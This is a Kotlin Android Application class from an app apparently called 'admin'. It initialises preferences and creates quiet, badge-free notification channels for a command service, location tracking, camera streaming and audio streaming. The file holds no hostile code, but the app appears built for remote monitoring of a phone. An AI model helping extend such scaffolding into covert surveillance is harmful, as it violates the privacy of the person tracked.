package com.abuzahra.admin

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import com.abuzahra.admin.manager.PreferenceManager
import com.abuzahra.admin.network.ApiService

class App : Application() {
    
    companion object {
        @Volatile
        private var instance: App? = null
        
        fun getInstance(): App {
            return instance ?: throw IllegalStateException("Application not initialized")
        }
        
        const val CHANNEL_ID_SERVICE = "service_channel"
        const val CHANNEL_ID_LOCATION = "location_channel"
        const val CHANNEL_ID_CAMERA = "camera_channel"
        const val CHANNEL_ID_AUDIO = "audio_channel"
    }
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        
        // Initialize preference manager
        PreferenceManager.init(this)
        
        // Create notification channels
        createNotificationChannels()
        
        // Start command service
        startCommandService()
    }
    
    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            
            // Service channel
            val serviceChannel = NotificationChannel(
                CHANNEL_ID_SERVICE,
                "Service Channel",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service notifications"
                setShowBadge(false)
            }
            
            // Location channel
            val locationChannel = NotificationChannel(
                CHANNEL_ID_LOCATION,
                "Location Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Location tracking service"
                setShowBadge(false)
            }
            
            // Camera channel
            val cameraChannel = NotificationChannel(
                CHANNEL_ID_CAMERA,
                "Camera Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Camera streaming service"
                setShowBadge(false)
            }
            
            // Audio channel
            val audioChannel = NotificationChannel(
                CHANNEL_ID_AUDIO,
                "Audio Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Audio streaming service"
                setShowBadge(false)
            }
            
            notificationManager.createNotificationChannels(
                listOf(serviceChannel, locationChannel, cameraChannel, audioChannel)
            )
        }
    }
    
    private fun startCommandService() {
        // Command service will be started by MainActivity after permission check
    }
}
